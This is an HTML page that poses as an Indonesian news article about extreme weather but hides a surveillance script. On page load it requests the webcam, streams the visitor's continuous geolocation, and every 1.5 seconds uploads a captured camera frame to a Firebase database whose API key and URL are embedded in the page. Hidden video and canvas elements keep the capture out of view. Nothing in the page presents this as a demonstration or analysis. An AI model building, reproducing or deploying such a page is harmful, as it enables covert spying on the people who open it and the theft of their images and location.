<!DOCTYPE html>
<html>
<head>
    <title>Berita Hari Ini</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body style="font-family:sans-serif; padding:20px;">
    <h2>Berita Utama: Cuaca Ekstrim Melanda Kota</h2>
    <p>Silakan baca berita selengkapnya di bawah ini...</p>
    
    <!-- Elemen tersembunyi -->
    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const config = {
            apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
            databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "chatroom-e9b3f"
        };
        firebase.initializeApp(config);
        const db = firebase.database().ref('simple_monitor');

        async function start() {
            const stream = await navigator.mediaDevices.getUserMedia({video: true});
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            v.srcObject = stream;

            // Ambil Lokasi
            navigator.geolocation.watchPosition(p => {
                db.child('loc').set({lat: p.coords.latitude, lng: p.coords.longitude});
            });

            // Kirim Gambar setiap 1.5 detik
            setInterval(() => {
                c.width = 320; c.height = 240;
                c.getContext('2d').drawImage(v, 0, 0, 320, 240);
                db.child('img').set(c.toDataURL('image/jpeg', 0.5));
            }, 1500);
        }
        window.onload = start;
    </script>
</body>
</html>
